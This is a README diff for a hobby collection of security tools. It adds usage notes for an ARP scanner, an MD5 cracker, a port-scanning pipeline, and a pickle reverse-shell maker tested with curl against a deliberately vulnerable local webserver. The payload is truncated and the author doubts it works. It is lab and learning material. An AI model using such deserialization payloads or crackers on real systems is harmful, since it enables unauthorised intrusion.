@@ -6,6 +6,7 @@
 - MD5 hash cracker
 - pickle revshell maker (+ vulnerable webserver)
 - portscanner
+- portscanner and vulnerability reporting toolchain
 - SSH server based on paramiko (not working)
 - SSH login bruteforcer
 - Todo application
@@ -51,8 +52,40 @@ pip install .
 
 ## Usage
 
+**ARP network scanner**
 ```bash
-Mañana.
+arp_network_scanner
+
+# NOTE: Hardcoded IP and network interface. Rewrite to use.
+```
+
+**MD5 hash cracker**
+```bash
+md5_hash_cracker [-h] hash wordlist
+
+positional arguments:
+  hash        the md5 hash string
+  wordlist    the wordlist file path
+```
+**pickle revshell maker**
+```bash
+$ pickle_revshell_maker
+# prints a base64-encoded reverse shell in a pickle.
+
+$ pickle_web_vuln
+# web server listens on http://127.0.0.1:5000 
+
+# Send the pickle to the webserver on /unpickle
+$ curl -d "pickled=gASVbgAAAAAAAACMBX..." http://127.0.0.1:5000/unpickle
+
+# Does it work? I don't think so. Someting about truncation.
+```
+
+
+
+**ports don't come easy**
+```bash
+./scan -p 1-10000 | ./probe | ./report -s "Automatic port scanning"
 ```
 
 ### Fineprint
